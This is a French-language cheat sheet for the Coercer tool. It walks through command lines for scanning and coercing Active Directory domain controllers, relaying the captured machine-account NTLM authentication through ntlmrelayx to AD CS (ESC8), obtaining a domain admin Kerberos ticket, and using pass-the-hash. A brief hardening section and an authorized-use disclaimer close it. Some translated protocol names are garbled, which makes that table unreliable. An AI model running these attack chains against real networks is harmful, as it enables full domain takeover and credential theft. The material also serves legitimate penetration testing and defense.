<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 Coercer - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Licence GPLv3">
</p>

<p align="center">
  <b>🌐 Analysez, détectez et contraignez automatiquement les serveurs Windows et les contrôleurs de domaine à s'authentifier auprès de machines arbitraires via plus de 12 protocoles RPC</b>
</p>

---

## 📋 Table des matières

-[Vue d'ensemble et primitive de coercition d'authentification](#-overview--the-authentication-coercion-primitive)
- [Protocoles et méthodes RPC pris en charge](#-supported-rpc-protocols--methods)
- [Installation](#-installation)
- [Recherche des interfaces RPC vulnérables (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Exécution de la coercition d'authentification (`coerce`)](#-executing-authentication-coercion-coerce)
-[La chaîne d'attaque complète : Coercition -> Relais NTLM -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [Filtrage de protocoles et de méthodes](#-protocol--method-filtering)
- [Support Kerberos et Pass-the-Hash](#-kerberos--pass-the-hash-support)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et durcissement](#-considérations-defensives--durcissement)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et primitive de coercition d'authentification

Dans les environnements Active Directory, la **coercition d'authentification** est une primitive offensive dévastatrice. Il exploite les anciennes interfaces RPC implémentées dans les services Windows qui permettent à un utilisateur authentifié de demander à une machine distante (comme un contrôleur de domaine) de se connecter à un chemin UNC désigné (`\\attacker\share`).

Lorsque la machine Windows distante se connecte à la machine contrôlée par l'attaquant, elle lance l'**authentification NTLM du compte de machine** (`DC01$`). 

En capturant ou en relayant ces informations d'identification de compte d'ordinateur à l'aide de `ntlmrelayx` vers les services de certificats Active Directory (inscription Web AD CS - ESC8) ou des cibles de délégation sans contrainte, les attaquants peuvent obtenir une **compromission complète immédiate du domaine**.

Rédigé par **Clément Notin (p0dalirius)**, **Coercer** unifie plus d'une douzaine d'exploits de coercition individuels (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) dans un cadre unique, automatisé et hautement modulaire.

---

## 🔌 Protocoles et méthodes RPC pris en charge

Coercer teste et exploite les interfaces RPC suivantes :

| Nom du protocole | Nom d'exploit commun | Tuyau / Interface |
|---------------|-----------|-------------------|
| **MS-EFSRPC** | Petit Potam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | Bug d'imprimante/SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | Coerce de l'Ombre | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoerce | `\pipe\netdfs` |
| **MS-PAN** | ImprimerCauchemar adjacent | Administration d'impression à distance |
| **MS-SAMR** | Fromagerie | Gestionnaire de comptes de sécurité |

---

## 📥Installation
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 Recherche d'interfaces RPC vulnérables (`scan`)

Avant de déclencher la coercition, analysez en toute sécurité les contrôleurs de domaine cibles pour découvrir quelles fonctions RPC sont activées et accessibles :
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ Exécution de la coercition d'authentification (`coerce`)

Déclenchez une connexion NTLM sortante de compte d’ordinateur depuis le contrôleur de domaine cible vers votre écouteur :
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 La chaîne d'attaque complète : Coercition -> Relais NTLM -> AD CS ESC8

Le vecteur canonique d’escalade de domaine :
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 Filtrage des protocoles et des méthodes

Ciblez une méthode spécifique sans spammer tout le spectre RPC :
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Prise en charge de Kerberos et Pass-the-Hash
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Scan DC pour la coercition** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Contraindre l'authentification** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Contraindre via MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Contraindre via MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Coercition de transmission du hachage** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Contrainte de ticket Kerberos** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Considérations défensives et durcissement

1. **Désactiver le spouleur d'impression sur les contrôleurs de domaine :** Le service Spouleur d'impression (`spoolsv.exe`) doit être complètement désactivé sur les contrôleurs de domaine (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **Activez la protection étendue pour l'authentification (EPA) :** Sur les serveurs AD CS IIS, activez EPA et exigez HTTPS pour bloquer les attaques de relais NTLM.
3. **Filtrage RPC et segmentation du réseau :** Restreignez l'accès du mappeur de points de terminaison RPC (port TCP 135) aux sous-réseaux administratifs autorisés.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Coercer déclenche des appels d'authentification à distance actifs qui peuvent déstabiliser les services de domaine non corrigés. À utiliser exclusivement lors de tests d'intrusion autorisés et avec le consentement explicite du client.